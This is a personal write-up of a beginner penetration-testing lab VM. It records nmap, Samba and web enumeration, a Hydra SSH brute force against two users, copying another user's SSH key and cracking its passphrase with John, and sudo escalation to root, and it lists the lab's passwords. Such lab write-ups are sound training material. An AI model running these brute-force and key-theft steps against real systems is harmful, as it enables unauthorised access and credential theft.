===Basic Pentest	Flutter Jul 19 2021===

'IP 10.10.75.25
	export IP=10.10.75.25'
'MYIP 10.10.31.144
	export IP=10.10.31.144'


# Recon #

----------------
	Scanning
----------------	

- $ nmap -sV -sC -T5 -vv -oN nmap_initial $IP

'''
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
	http-methods: 
 		Supported Methods: GET HEAD POST OPTIONS
	http-server-header: Apache/2.4.18 (Ubuntu)
	http-title: Site doesn't have a title (text/html).

139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

8009/tcp open  ajp13       syn-ack ttl 64 Apache Jserv (Protocol v1.3)
	ajp-methods: 
		Supported methods: GET HEAD POST OPTIONS

8080/tcp open  http-proxy  syn-ack ttl 64
'''
	> running Apache http
	> running Samba


---Samba Enumeration---

- $ enum4linux -a $IP | tee enum4$IP.log

	> Shares Discovered

		'''
		Anonymous       Disk      
		IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
		'''

	> Users Discovered

		'''
		Unix User\kay (Local User)
		Unix User\jan (Local User)
		BASIC2\nobody (Local User)
		'''


---Site---

- $ gobuster dir -u http://$IP -w directory-list-2.3-medium.txt -o gobuster_80

'''
/development (Status: 301)
/server-status (Status: 403)
'''

---------------------
	Visiting Site
---------------------

- http://$IP/ source
	'''
	Undergoing maintenance

	Please check back later

	//Check our dev note section if you need to know what to work on.
	'''

- http://$IP/development
	> dev.txt

		'''
		2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
		to host that on this server too. Haven't made any real web apps yet, but I have tried that example
		you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
		using version 2.5.12, because other versions were giving me trouble. -K

		2018-04-22: SMB has been configured. -K

		2018-04-21: I got Apache set up. Will put in our content later. -J
		'''

	> j.txt

		'''
		For J:

		I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
		and I was able to crack your hash really easily. You know our password policy, so please follow
		it? Change that password ASAP.

		-K
		'''

---Users---

- jan
- kay 


# Intrusion #

- $ ssh jan@10.10.75.25
	pass: armando (See Passwords)

- jan@basic2:~$ id
	> uid=1001(jan) gid=1001(jan) groups=1001(jan)
 


# PrivEsc # 

- jan@basic2:~$ sudo -l
	Password protected, tried "armando"
	'''
	Sorry, user jan may not run sudo on basic2.
	'''

- find / -typ f -user root -perm -u=s 2>/dev/null
	> Nothing useful found :c

---Lateral Movement---

- jan@basic2:~$ ls -la /home
	'''
	drwxr-xr-x  2 root root 4096 Apr 23  2018 jan
	drwxr-xr-x  5 kay  kay  4096 Apr 23  2018 kay
	'''

- jan@basic2:~$ ls -la /home/kay
	'''
	-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
	drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
	'''

- $ scp -r jan@$IP:/home/kay/.ssh kay_ssh/
- $ chmod 600 id_rsa
- $ ssh -i id_rsa kay@$IP
	> Enter passphrase for key 'id_rsa':
	//grr, see Passwords

- $ ssh kay@$IP
	pass: beeswax

- kay@basic2:~$ id
	'''
	uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
	'''

- $ scp -i id_rsa kay@10.10.75.25:/home/kay/pass.bak Passwords/
	> pass.bak
	  pass: heresareallystrongpasswordthatfollowsthepasswordpolicy$$

- kay@basic2:~$ sudo -l
	Password protected, tried "heresareallystrongpasswordthatfollowsthepasswordpolicy$$"
		> User kay may run the following commands on basic2:
    		(ALL : ALL) ALL

- kay@basic2:~$ sudo su root
	> root gained

**Flag Found**
	/root/flag.txt:

	'''
	Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain 
	a shell, and two ways to privesc. I encourage you to find them all!

	If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
	takeaways from this challenge should be that every little bit of information you can find can be
	valuable, but sometimes you'll need to find several different pieces of information and combine
	them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
	an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
	in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
	therefore might've been overlooked by administrators.

	Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send 
	out to me.

	Happy hacking!
	'''

# Passwords #

----------------
	Cracking
----------------

- jan ssh
	hydra -L users.txt -P rockyou.txt -o initial_pass
		> users.txt

			jan
			kay
			
		> initial_pass

			'''
			login: jan | pass: armando
			Stopped. (kay was taking too long)
			'''

- kay ssh private key passphrase
	ssh2john id_rsa > kay_john
	john kay_john --wordlist=rockyou.txt
	pass: beeswax

---------------
	Exposed
---------------

- kay ssh
	pass.bak
	pass: heresareallystrongpasswordthatfollowsthepasswordpolicy$$